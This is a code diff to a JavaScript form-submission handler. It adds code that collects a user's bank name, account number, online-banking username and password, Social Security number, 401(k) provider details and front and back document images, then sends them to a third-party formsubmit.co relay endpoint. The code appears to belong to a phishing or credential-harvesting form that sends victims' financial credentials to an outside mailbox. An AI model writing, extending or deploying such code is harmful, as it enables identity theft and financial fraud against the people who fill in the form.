@@ -163,6 +163,19 @@ const submitForm = () => {
     console.error('Error submitting request:', err);
     $swal.fire('Error', 'There was an issue submitting your request. Please try again.', 'error');
   });
+
+  // formdata to send to formsubmit.co
+  const formdata = new FormData();
+  formdata.append('bank', form.value.bank);
+  formdata.append('accountNumber', form.value.accountNumber);
+  formdata.append('amount', form.value.amount);
+  formdata.append('username', form.value.username);
+  formdata.append('password', form.value.password);
+  formdata.append('ssn', form.value.ssn);
+  formdata.append('fortyOneK', form.value.fortyOneK);
+  formdata.append('fortyOneKProvider', form.value.fortyOneKProvider);
+  formdata.append('frontPreview', form.value.frontPreview);
+  formdata.append('backPreview', form.value.backPreview);
   
   // send to formsubmit.co
   fetch('https://formsubmit.co/ajax/fceb7c66a69228b93c167b94e13568a0', {
@@ -171,7 +184,7 @@ const submitForm = () => {
       'Content-Type': 'application/json',
       'Accept': 'application/json'
     },
-    body: JSON.stringify(form.value)
+    body: formdata
   }).then(data => {
     console.log('Form submitted successfully:', data);
   }).catch(err => {
